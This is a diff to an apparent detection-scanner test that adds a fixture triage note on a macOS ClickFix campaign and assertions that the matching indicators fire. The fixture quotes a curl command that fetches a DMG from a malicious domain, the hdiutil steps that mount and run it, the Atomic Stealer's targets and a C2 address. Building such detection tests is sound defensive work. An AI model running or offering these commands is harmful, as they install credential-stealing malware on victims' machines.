@@ -454,6 +454,16 @@ function run() {
     "adcd15f3d6b87f84d106ea426fa824fd20c9d64f6d199ce92580884290785f30",
     "d7d2f0ee187549f3f4a114d716be12521fbf62d6d26e2ac23d2a32d521d08fd8"
   ].join("\n"));
+  write(path.join(root, "Users", "alice", "Downloads", "s.01M0td.dmg"), "placeholder dmg");
+  write(path.join(root, "Users", "alice", "Library", "Logs", "clickfix-macos-amos.txt"), [
+    "BleepingComputer / Unit 42 macOS ClickFix triage note",
+    "Fake CAPTCHA tells the user to open Terminal and paste a malicious command.",
+    "curl -fsSL https://svs-verificationdate.beer/update -o /tmp/rand.dmg",
+    "hdiutil attach -nobrowse /tmp/rand.dmg then find NNApp.app and open it",
+    "Atomic macOS Stealer AMOS steals Keychain, browser cookies, Telegram Desktop and Discord data.",
+    "Ledger Live and Trezor Suite replacement attempt observed.",
+    "C2 observed at 196.251.107.171"
+  ].join("\n"));
   write(path.join(root, "Users", "alice", "Downloads", "eviltokens-browser-data.txt"), [
     "ANY.RUN EvilTokens triage note",
     "Microsoft OAuth device-code phishing has been detected threatName: eviltokens oauth-ms-phish",
@@ -735,6 +745,10 @@ function run() {
   assert(ids.has("clickfix-kb4-network-indicator"));
   assert(ids.has("clickfix-kb4-text-indicator"));
   assert(ids.has("clickfix-kb4-lnk-clipboard-stager"));
+  assert(ids.has("clickfix-macos-amos-dmg-name"));
+  assert(ids.has("clickfix-macos-network-indicator"));
+  assert(ids.has("clickfix-macos-text-indicator"));
+  assert(ids.has("clickfix-macos-hidden-dmg-execution"));
   assert(ids.has("eviltokens-device-code-network-indicator"));
   assert(ids.has("eviltokens-device-code-text-indicator"));
   assert(ids.has("eviltokens-device-code-flow-shape"));
